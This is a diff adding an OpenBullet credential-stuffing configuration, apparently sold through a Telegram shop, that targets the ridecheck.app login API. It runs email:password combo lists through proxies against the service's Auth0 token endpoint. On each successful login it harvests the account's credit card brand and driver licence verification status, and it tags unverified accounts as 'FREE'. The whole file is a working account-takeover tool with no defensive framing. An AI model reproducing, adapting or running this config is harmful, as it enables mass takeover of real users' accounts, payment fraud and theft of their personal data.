@@ -1,0 +1,108 @@
+[SETTINGS]
+{
+  "Name": "CheckAPI",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-06T21:09:13.2646835+02:00",
+  "AdditionalInfo": "Dedrilath | Capture: CreditcardType & IsDriverLicenceVerified | Custom: NoDriverLicenceVerified | Channel: https://t.me/DedrilathShop",
+  "Author": "Dedrilath",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateOAuthChallenge -> VAR "A" 
+
+REQUEST POST "https://auth.ridecheck.app/oauth/token" 
+  CONTENT "{\"realm\":\"Username-Password-Authentication\",\"username\":\"<USER>\",\"grant_type\":\"http:\\/\\/auth0.com\\/oauth\\/grant-type\\/password-realm\",\"client_id\":\"xkyjFpKcppQTy1035wQdpBHCDoFKsMFA\",\"audience\":\"https:\\/\\/api.ridecheck.app\",\"scope\":\"openid profile email offline_access\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Cookie: did=s%3Av0%3A06c3ce20-8e68-11ea-bee1-b1fd7c35b02d.ahju%2BFKR4AE9YL%2BSh5Qn6r7cWR4bUr7xLjwnBpVr5T0; did_compat=s%3Av0%3A06c3ce20-8e68-11ea-bee1-b1fd7c35b02d.ahju%2BFKR4AE9YL%2BSh5Qn6r7cWR4bUr7xLjwnBpVr5T0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "Auth0-Client: <A>" 
+  HEADER "Accept-Language: nl-nl" 
+  HEADER "Content-Length: 295" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "User-Agent: Check/7142 CFNetwork/1121.2.2 Darwin/19.3.0" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "B" 
+
+REQUEST GET "https://api.ridecheck.app/payment-methods" 
+  
+  HEADER "Host: api.ridecheck.app" 
+  HEADER "Cookie: AWSELB=E395B94114F94632C55AAE3487E159CA0752529CB3ACEA9849B043AB685DFE5285CBA73A2302823D175DD8A3CC43455847FFCF86CF04960E3E081D9B276C185041E20B8494; AWSELBCORS=E395B94114F94632C55AAE3487E159CA0752529CB3ACEA9849B043AB685DFE5285CBA73A2302823D175DD8A3CC43455847FFCF86CF04960E3E081D9B276C185041E20B8494" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Fingerprint: 10A2CBA3-5A0F-4822-9385-D9012DDE8134" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Check/1.1.0 iPhone10,6 iOS/13.3.1 CFNetwork/1121.2.2 Darwin/19.3.0" 
+  HEADER "Authorization: Bearer <B>" 
+  HEADER "Accept-Language: nl-nl" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+PARSE "<SOURCE>" JSON "brand" CreateEmpty=FALSE -> CAP "CreditcardType" "CreditcardType: " "" 
+
+REQUEST GET "https://api.ridecheck.app/license-verification" 
+  
+  HEADER "Host: api.ridecheck.app" 
+  HEADER "Cookie: AWSELB=E395B94114F94632C55AAE3487E159CA0752529CB3ACEA9849B043AB685DFE5285CBA73A2302823D175DD8A3CC43455847FFCF86CF04960E3E081D9B276C185041E20B8494; AWSELBCORS=E395B94114F94632C55AAE3487E159CA0752529CB3ACEA9849B043AB685DFE5285CBA73A2302823D175DD8A3CC43455847FFCF86CF04960E3E081D9B276C185041E20B8494" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Fingerprint: 10A2CBA3-5A0F-4822-9385-D9012DDE8134" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Check/1.1.0 iPhone10,6 iOS/13.3.1 CFNetwork/1121.2.2 Darwin/19.3.0" 
+  HEADER "Authorization: Bearer <B>" 
+  HEADER "Accept-Language: nl-nl" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+PARSE "<SOURCE>" JSON "status" -> VAR "S" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<S>" Contains "initialized" 
+
